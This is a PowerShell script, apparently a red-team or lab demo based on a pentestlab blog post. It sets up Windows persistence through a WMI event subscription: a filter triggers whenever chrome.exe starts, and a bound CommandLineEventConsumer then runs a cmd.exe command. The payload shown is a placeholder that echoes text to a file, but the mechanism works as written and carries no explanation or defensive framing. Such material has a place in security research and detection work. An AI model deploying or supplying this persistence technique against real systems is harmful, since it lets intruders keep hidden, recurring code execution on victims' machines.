# Based on https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/

# Creating a new event filter
$FilterArgs = @{
  Name           = 'BugSecFilter'
  EventNamespace = 'root\CIMV2'
  QueryLanguage  = 'WQL'
  Query          = "select * from __InstanceCreationEvent  within 5 where targetInstance isa 'Win32_Process' and TargetInstance.Name = 'chrome.exe'"
}

$filterResult = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
# Creating a new event consumer
$ConsumerArgs = @{
  name                = 'BugSecConsumer';
  CommandLineTemplate = "cmd.exe /c echo test > c:\WMI-Cim.txt";
}

$consumerResult = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
# Bind filter and consumer
$FilterToConsumerArgs = @{
  Filter   = [Ref] $filterResult;
  Consumer = [Ref] $consumerResult;
}

New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs